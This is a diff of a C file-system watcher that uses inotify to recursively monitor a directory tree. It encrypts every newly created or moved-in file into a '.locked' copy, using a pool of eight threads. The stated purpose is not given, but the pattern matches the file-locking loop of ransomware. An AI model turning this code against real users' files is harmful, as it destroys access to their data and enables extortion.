@@ -4,45 +4,56 @@
 #include <unistd.h>
 #include <sys/inotify.h>
 #include <sys/stat.h>
+#include <sys/select.h>
 #include <dirent.h>
 #include <stdbool.h>
 #include "../../headers/queue.h"
 #include "../../headers/globals.h"
 #include "../../headers/encryption.h"
+#include "../../headers/thread.h"
 
 #define BUF_LEN 4096
-#define MAX_WATCHES 1024
-
-
-//run with (for now): gcc src/encryption/watcher.c src/encryption/queue.c -o watcher
+#define MAX_WATCHES 8192
+#define THREADS_NUMBER 8
 
 char watchedPaths[MAX_WATCHES][1024];
 
-bool is_temp_file(const char *name) {
-    if (name[0] == '.') {
+void traverse(const char *path);
+
+bool is_skipped(const char *name) {
+    if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0)
         return true;
-    }
+    if (name[0] == '.')
+        return true;
+    if (name[0] == '_' && name[1] == '_')
+        return true;
+    if (strcmp(name, "venv") == 0)
+        return true;
+    if (strcmp(name, "node_modules") == 0)
+        return true;
+    if (strcmp(name, "site-packages") == 0)
+        return true;
 
     size_t len = strlen(name);
-
-    if (len > 5 && strcmp(name + len - 5, ".part") == 0) {
+    if (len > 5 && strcmp(name + len - 5, ".part") == 0)
         return true;
-    }
-
     return false;
 }
 
-//yoinked from frederic (ty bro)
-void watcher_traverse(int ifd, const char *path) {
+void watcher_traverse(int fd, const char *path) {
 
-    int wd = inotify_add_watch(ifd, path, IN_CREATE | IN_MOVED_TO | IN_CLOSE_WRITE);
+    const char *dirname = strrchr(path, '/');
+    dirname = dirname ? dirname + 1 : path;
+    if (dirname[0] == '.' || (dirname[0] == '_' && dirname[1] == '_'))
+        return;
 
+    int wd = inotify_add_watch(fd, path, IN_CREATE | IN_MOVED_TO);
 
     if (wd == -1) {
-        perror("wd == -1");
-
+        perror("inotify_add_watch");
     } else {
-        strncpy(watchedPaths[wd], path, sizeof(watchedPaths[wd]));
+        strncpy(watchedPaths[wd], path, sizeof(watchedPaths[wd]) - 1);
+        watchedPaths[wd][sizeof(watchedPaths[wd]) - 1] = '\0';
         printf("watching: %s\n", path);
     }
 
@@ -54,7 +65,7 @@ void watcher_traverse(int ifd, const char *path) {
 
     struct dirent *entry;
     while ((entry = readdir(dir)) != NULL) {
-        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+        if (is_skipped(entry->d_name))
             continue;
 
         char fullPath[1024];
@@ -64,108 +75,109 @@ void watcher_traverse(int ifd, const char *path) {
         }
 
         struct stat statbuf;
-        if (stat(fullPath, &statbuf) == -1) {
-            perror("stat");
+        if (lstat(fullPath, &statbuf) == -1) {
+            perror("lstat");
             continue;
         }
 
-        if (S_ISLNK(statbuf.st_mode)) {
-            continue;
-        }
-        
         if (S_ISDIR(statbuf.st_mode)) {
-            watcher_traverse(ifd, fullPath);
+            watcher_traverse(fd, fullPath);
         }
     }
-
     closedir(dir);
 }
 
-
 void *start_watcher(void *args) {
 
-    int ifd = inotify_init();
-
-    watcher_traverse(ifd, start_path);
+    int fd = inotify_init();
+    watcher_traverse(fd, start_path);
 
     char buf[BUF_LEN];
+    bool clearBuffer = false;
 
     while (true) {
 
-        int len = read(ifd, buf, BUF_LEN);
-        
-        if (full_encryption_active) {
+        if (!watcher_on) {
+            clearBuffer = true;
+            sleep(1);
             continue;
         }
+
+        if (clearBuffer) {
+            clearBuffer = false;
+            char discard[BUF_LEN];
+            fd_set readable;
+            struct timeval instant = {0, 0};
+            FD_ZERO(&readable);
+            FD_SET(fd, &readable);
+            while (select(fd +1, &readable, NULL, NULL, &instant) > 0) {
+                read(fd, discard, BUF_LEN);
+                FD_ZERO(&readable);
+                FD_SET(fd, &readable);
+            }
+        }
+
+        int len = read(fd, buf, BUF_LEN);
 
         int i = 0;
         while (i < len) {
 
             struct inotify_event *event = (struct inotify_event *)&buf[i];
 
-
             if (event->len > 0) {
-                            
-            if (strstr(event->name, ".locked") != NULL) {
-            i += sizeof(struct inotify_event) + event->len;
-            continue;
-            }
 
-                char full_path[1024] = "";
-                strcat(full_path, watchedPaths[event->wd]);
-                strcat(full_path, "/");
-                strcat(full_path, event->name);
+                if (is_skipped(event->name) || strstr(event->name, ".locked") != NULL) {
+                    i += sizeof(struct inotify_event) + event->len;
+                    continue;
+                }
 
-                if (event->mask & IN_ISDIR) {
-                    watcher_traverse(ifd, full_path);
-                } else if (event->mask & IN_MOVED_TO) {
-                    if (!is_temp_file(event-> name)) {
-                        printf("new file: %s\n", full_path);
-                        if (encryption_active && access(full_path, F_OK) ==0) {
+                char full_path[1024];
+                if (snprintf(full_path, sizeof(full_path), "%s/%s", watchedPaths[event->wd], event->name) >= sizeof(full_path)) {
+                    fprintf(stderr, "Path too long: %s/%s\n", watchedPaths[event->wd], event->name);
+                    i += sizeof(struct inotify_event) + event->len;
+                    continue;
+                }
 
-                            unsigned char key[16];
-                            use_key(key);
-                            char *locked = encrypt_file(full_path, key);
-                            wipe_key(key);
-                            if (locked != NULL) {
+                if (event->mask & IN_ISDIR && event->mask & IN_MOVED_TO) {
+                    watcher_traverse(fd, full_path);
+                    clear_queue(&queue);
+                    traverse(full_path);
+                    enqueue(&queue, "END_ENCRYPT");
+                    initialize_threads(THREADS_NUMBER, true);
 
-                                remove_by_value(&queue, "END_ENCRYPT");
-                                enqueue(&queue, locked);
-
-                                enqueue(&queue, "END_ENCRYPT");
-
-                                free(locked);
-                            }
-                            // print_queue(&queue);
-                        } else {
-                                remove_by_value(&queue, "END_ENCRYPT");
-                                enqueue(&queue, full_path);
-                                enqueue(&queue, "END_ENCRYPT"); 
-                        }
+                } else if (event->mask & IN_ISDIR && event->mask & IN_CREATE) {
+                    if (strcmp(watchedPaths[event->wd], start_path) == 0) {
+                        sleep(2);
+                        watcher_traverse(fd, full_path);
+                        clear_queue(&queue);
+                        traverse(full_path);
+                        enqueue(&queue, "END_ENCRYPT");
+                        initialize_threads(THREADS_NUMBER, true);
+                    } else {
+                        watcher_traverse(fd, full_path);
                     }
-                } else if (event->mask & IN_CLOSE_WRITE) {
 
-                    if (!is_temp_file(event->name)) {
+                } else if (event->mask & IN_MOVED_TO) {
+                    printf("new file: %s\n", full_path);
+                    unsigned char key[16];
+                    use_key(key);
+                    char *locked = encrypt_file((char *)full_path, key);
+                    wipe_key(key);
+                    if (locked != NULL) {
+                        enqueue(&queue, locked);
+                        free(locked);
+                    }
+                }
+                else if (event->mask & IN_MOVED_TO || event->mask & IN_CLOSE_WRITE) {
+                    if (!is_skipped(event->name)) {
                         printf("new file: %s\n", full_path);
-
-                        if (encryption_active && access( full_path, F_OK) == 0) {
-
-                            unsigned char key[16];
-                            use_key(key);
-                            char *locked = encrypt_file(full_path, key);
-                            wipe_key(key);
-                            
-                            if (locked != NULL) {
-                                remove_by_value(&queue, "END_ENCRYPT");
-                                enqueue(&queue, locked);
-                                enqueue(&queue, "END_ENCRYPT");
-                                free(locked);
-                            }
-                            //print_queue(&queue);
-                        } else {
-                            remove_by_value(&queue, "END_ENCRYPT");
-                            enqueue(&queue, full_path);
-                            enqueue(&queue, "END_ENCRYPT"); 
+                        unsigned char key[16];
+                        use_key(key);
+                        char *locked = encrypt_file((char *)full_path, key);
+                        wipe_key(key);
+                        if (locked != NULL) {
+                            enqueue(&queue, locked);
+                            free(locked);
                         }
                     }
                 }
